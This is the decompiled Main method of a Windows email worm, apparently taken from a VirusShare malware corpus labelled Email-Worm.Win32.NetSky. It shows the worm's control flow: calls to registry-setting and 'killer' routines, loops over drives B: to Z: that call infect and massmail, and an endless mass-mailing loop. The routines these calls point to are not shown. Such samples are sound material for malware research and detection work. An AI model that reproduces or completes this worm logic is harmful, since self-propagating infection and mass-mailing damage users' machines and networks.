// Decompiled with JetBrains decompiler
// Type: Amir.Program
// Assembly: virus, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 29FAD37A-A306-4DD1-B69F-F402CC0E6FE7
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Email-Worm.Win32.NetSky.gqw-84f16e85d2b28953d61e95f48fa22b03859b066aae1c5ea68cc014b2af0ecfb8.exe

using System;
using System.IO;
using System.Threading;

namespace Amir
{
  internal static class Program
  {
    [STAThread]
    private static void Main()
    {
      Amir.Amir amir = new Amir.Amir();
      amir.ccopy();
      amir.happy();
      amir.killer();
      amir.regist2();
      amir.regist3();
      amir.setreg();
      amir.setreg7();
      amir.setreg8();
      amir.setreg9();
      for (char ch = 'B'; ch <= 'Z'; ++ch)
      {
        string str = ch.ToString() + ":\\";
        if (Directory.Exists(str))
        {
          try
          {
            amir.DispEXE(str);
          }
          catch (Exception ex)
          {
            amir.killer();
          }
        }
      }
      for (char ch = 'B'; ch <= 'Z'; ++ch)
      {
        string str = ch.ToString() + ":\\";
        if (Directory.Exists(str))
        {
          try
          {
            amir.infect(str);
          }
          catch (Exception ex)
          {
            amir.killer();
          }
        }
      }
      for (char ch = 'B'; ch <= 'Z'; ++ch)
      {
        string str = ch.ToString() + ":\\";
        if (Directory.Exists(str))
        {
          try
          {
            amir.massmail(str);
          }
          catch (Exception ex)
          {
            amir.killer();
          }
        }
      }
      if (0 >= 5000)
        return;
label_19:
      for (char ch = 'B'; ch <= 'Z'; ++ch)
      {
        string str = ch.ToString() + ":\\";
        if (Directory.Exists(str))
        {
          try
          {
            amir.massmail(str);
          }
          catch (Exception ex)
          {
            amir.killer();
            Thread.Sleep(40000);
          }
        }
      }
      goto label_19;
    }
  }
}
